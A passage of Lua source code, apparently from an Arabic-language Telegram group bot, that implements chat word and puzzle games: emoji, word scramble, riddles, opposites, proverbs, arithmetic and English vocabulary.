name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📒','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
WAAD = '⌯︙اول واحد يدز هذا السمايل يربح ↫ '..name
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
return false
end end
if text == DevAIAN:get(WAAD..'AIAN:GameNum'..msg.chat_id_) and not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then
if not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then 
WAAD = '⌯︙مبروك لقد ربحت في اللعبه \n⌯︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAIAN:set(WAAD..'AIAN:Games:Ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and ChCheck(msg) or text == 'الترتيب' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
DevAIAN2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = DevAIAN2[math.random(#DevAIAN2)]
DevAIAN:set(WAAD..'AIAN:GameNum'..msg.chat_id_,name)
DevAIAN:del(WAAD..'AIAN:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
WAAD = '⌯︙اول واحد يرتبها يربح ↫ '..name
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
return false
end end
if text == DevAIAN:get(WAAD..'AIAN:GameNum'..msg.chat_id_) and not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then
if not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then 
WAAD = '⌯︙مبروك لقد ربحت في اللعبه \n⌯︙ارسل ↫ ترتيب للعب مره اخرى'
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAIAN:set(WAAD..'AIAN:Games:Ids'..msg.chat_id_,true)
end
if text == 'محيبس' and ChCheck(msg) or text == 'بات' and ChCheck(msg) or text == 'المحيبس' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevAIAN:set(WAAD.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿

⌯︙اختر رقم لاستخراج المحيبس
⌯︙الفائز يحصل على (5) نقاط
]]
Dev_AIAN(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevAIAN:setex(WAAD.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'حزوره' and ChCheck(msg) or text == 'الحزوره' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
DevAIAN2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = DevAIAN2[math.random(#DevAIAN2)]
DevAIAN:set(WAAD..'AIAN:GameNum'..msg.chat_id_,name)
DevAIAN:del(WAAD..'AIAN:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
WAAD = '⌯︙اول واحد يحلها يربح ↫ '..name
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
return false
end end
if text == DevAIAN:get(WAAD..'AIAN:GameNum'..msg.chat_id_) and not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then
if not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then 
WAAD = '⌯︙مبروك لقد ربحت في اللعبه \n⌯︙ارسل ↫ حزوره للعب مره اخرى'
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAIAN:set(WAAD..'AIAN:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المعاني' and ChCheck(msg) or text == 'معاني' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
DevAIAN2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = DevAIAN2[math.random(#DevAIAN2)]
DevAIAN:set(WAAD..'AIAN:GameNum2'..msg.chat_id_,name)
DevAIAN:del(WAAD..'AIAN:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
WAAD = '⌯︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
return false
end end
if text == DevAIAN:get(WAAD..'AIAN:GameNum2'..msg.chat_id_) and not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then
if not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then 
WAAD = '⌯︙مبروك لقد ربحت في اللعبه \n⌯︙ارسل ↫ المعاني للعب مره اخرى'
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAIAN:set(WAAD..'AIAN:Games:Ids'..msg.chat_id_,true)
end 
if text == 'العكس' and ChCheck(msg) or text == 'عكس' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
DevAIAN2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = DevAIAN2[math.random(#DevAIAN2)]
DevAIAN:set(WAAD..'AIAN:GameNum3'..msg.chat_id_,name)
DevAIAN:del(WAAD..'AIAN:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'محلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'حي','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
WAAD = '⌯︙ما هو عكس كلمة ↫ '..name
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
return false
end end
if text == DevAIAN:get(WAAD..'AIAN:GameNum3'..msg.chat_id_) and not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then
if not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then 
WAAD = '⌯︙مبروك لقد ربحت في اللعبه \n⌯︙ارسل ↫ العكس للعب مره اخرى'
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAIAN:set(WAAD..'AIAN:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المختلف' and ChCheck(msg) or text == 'مختلف' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
DevAIAN2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevAIAN2[math.random(#DevAIAN2)]
DevAIAN:set(WAAD..'AIAN:GameNum4'..msg.chat_id_,name)
DevAIAN:del(WAAD..'AIAN:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟⭐️🌟')
name = string.gsub(name,'📥','💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃️☃️☃️☃️⛄️☃️☃️☃️☃️')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀️','🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️')
name = string.gsub(name,'🧚‍♂️','🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♂️🧚‍♀️🧚‍♀️')
name = string.gsub(name,'🧝‍♂️','🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♂️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕓','🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
WAAD = '⌯︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
return false
end end
if text == DevAIAN:get(WAAD..'AIAN:GameNum4'..msg.chat_id_) and not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then
if not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then 
WAAD = '⌯︙مبروك لقد ربحت في اللعبه \n⌯︙ارسل ↫ المختلف للعب مره اخرى'
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAIAN:set(WAAD..'AIAN:Games:Ids'..msg.chat_id_,true)
end  
if text == 'امثله' and ChCheck(msg) or text == 'الامثله' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
DevAIAN2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = DevAIAN2[math.random(#DevAIAN2)]
DevAIAN:set(WAAD..'AIAN:GameNum5'..msg.chat_id_,name)
DevAIAN:del(WAAD..'AIAN:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي ___ للماعنده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل ___ ')
name = string.gsub(name,'بيدك','اكل ___ محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من ___ نعال')
name = string.gsub(name,'شقره','مع الخيل يا ___ ')
name = string.gsub(name,'النخله','الطول طول ___ والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر ___ ')
name = string.gsub(name,'الخيل','من قلة ___ شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني ___ ')
name = string.gsub(name,'المبلل',' ___ ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة ___ ')
name = string.gsub(name,'يركص','المايعرف ___ يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح ___ يكول حامض')
name = string.gsub(name,'العمه','___ إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي ___ للخباز حتى لو ياكل نصه')
name = string.gsub(name,'بالحصاد','اسمة ___ ومنجله مكسور')
name = string.gsub(name,'شهر','امشي ___ ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن ___ يا من على الحاضر لكة')
name = string.gsub(name,'القرد',' ___ بعين امه غزال')
name = string.gsub(name,'يكحله','اجه ___ عماها')
WAAD = '⌯︙اكمل المثال التالي ↫ ['..name..']'
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
return false
end end
if text == DevAIAN:get(WAAD..'AIAN:GameNum5'..msg.chat_id_) then
if not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then 
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAIAN:del(WAAD..'AIAN:GameNum5'..msg.chat_id_)
WAAD = '⌯︙مبروك لقد ربحت في اللعبه \n⌯︙ارسل ↫ امثله للعب مره اخرى'
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
end
DevAIAN:set(WAAD..'AIAN:Games:Ids'..msg.chat_id_,true)
end  
if text == 'رياضيات' and ChCheck(msg) or text == 'الرياضيات' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
DevAIAN2 = {'9','46','2','9','5','4','25','10','17','15','39','5','16',};
name = DevAIAN2[math.random(#DevAIAN2)]
DevAIAN:set(WAAD..'AIAN:GameNum6'..msg.chat_id_,name)
DevAIAN:del(WAAD..'AIAN:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'9','7 + 2 = ?')
name = string.gsub(name,'46','41 + 5 = ?')
name = string.gsub(name,'2','5 - 3 = ?')
name = string.gsub(name,'9','5 + 2 + 2 = ?')
name = string.gsub(name,'5','8 - 3 = ?')
name = string.gsub(name,'4','40 ÷ 10 = ?')
name = string.gsub(name,'25','30 - 5 = ?')
name = string.gsub(name,'10','100 ÷ 10 = ?')
name = string.gsub(name,'17','10 + 5 + 2 = ?')
name = string.gsub(name,'15','25 - 10 = ?')
name = string.gsub(name,'39','44 - 5 = ?')
name = string.gsub(name,'5','12 + 1 - 8 = ?')
name = string.gsub(name,'16','16 + 16 - 16 = ?')
WAAD = '⌯︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
return false
end end
if text == DevAIAN:get(WAAD..'AIAN:GameNum6'..msg.chat_id_) then
if not DevAIAN:get(WAAD..'AIAN:Games:Ids'..msg.chat_id_) then 
DevAIAN:incrby(WAAD..'AIAN:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAIAN:del(WAAD..'AIAN:GameNum6'..msg.chat_id_)
WAAD = '⌯︙مبروك لقد ربحت في اللعبه \n⌯︙ارسل ↫ رياضيات للعب مره اخرى'
Dev_AIAN(msg.chat_id_, msg.id_, 1,WAAD, 1, 'md')
end
DevAIAN:set(WAAD..'AIAN:Games:Ids'..msg.chat_id_,true)
end  
if text == 'الانكليزي' and ChCheck(msg) or text == 'الانجليزيه' and ChCheck(msg) or text == 'انكليزيه' and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Lock:Games'..msg.chat_id_) then
DevAIAN2 = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','سدني','نقود','اعلم','ذئب','تمساح','ذكي','شاطئ','غبي',};
name = DevAIAN2[math.random(#DevAIAN2)]
DevAIAN:set(WAAD..'AIAN:GameNum7'..msg.chat_id_,name)
DevAIAN:del(WAAD..'AIAN:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'ذئب','Wolf')
name = string.gsub(name,'معلومات','Information')
name = string.gsub(name,'قنوات','Channels')
name = string.gsub(name,'مجموعات','Groups')
name = string.gsub(name,'كتاب','Book')
name = string.gsub(name,'تفاحه','Apple')
name = string.gsub(name,'نقود','money')
name = string.gsub(name,'اعلم','I know')
name = string.gsub(name,'تمساح','crocodile')
name = string.gsub(name,'شاطئ','Beach')
name = string.gsub(name,'غبي','Stupid')
name = string.gsub(name,'صداقه','Friendchip')
WAAD = '⌯︙ما معنى كلمة ↫ '..name
